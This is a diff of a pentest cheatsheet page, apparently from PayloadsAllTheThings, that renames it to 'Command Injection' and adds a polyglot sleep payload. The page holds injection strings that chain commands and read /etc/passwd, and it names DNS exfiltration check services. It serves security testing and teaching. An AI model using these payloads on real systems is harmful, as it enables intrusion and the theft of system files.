@@ -1,11 +1,11 @@
-# Remote Commands Execution
+# Command Injection
 
-Remote Commands execution is a security vulnerability that allows an attacker to execute commands from a remote server.
-NOTE: Reverse Shell Command are relocated to a [single file](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
+Command injection is a security vulnerability that allows an attacker to execute arbitrary commands inside a vulnerable application.
+
 
 ## Exploits
 
-Normal Commands execution, execute the command and voila :p
+Normal command, execute the command and voila :p
 
 ```powershell
 cat /etc/passwd
@@ -17,7 +17,7 @@ sys:x:3:3:sys:/dev:/bin/sh
 
 Commands execution by chaining commands
 
-```powershell
+```bash
 original_cmd_by_server; ls
 original_cmd_by_server && ls
 original_cmd_by_server | ls
@@ -26,7 +26,7 @@ original_cmd_by_server || ls    Only if the first cmd fail
 
 Commands execution inside a command
 
-```powershell
+```bash
 original_cmd_by_server `cat /etc/passwd`
 original_cmd_by_server $(cat /etc/passwd)
 ```
@@ -166,6 +166,17 @@ Online tools to check for DNS based data exfiltration:
 
 - dnsbin.zhack.ca
 - pingb.in
+
+## Polyglot command injection
+
+```bash
+1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
+
+e.g:
+echo 1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
+echo '1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
+echo "1;sleep${IFS}9;#${IFS}';sleep${IFS}9;#${IFS}";sleep${IFS}9;#${IFS}
+```
 
 ## References
 
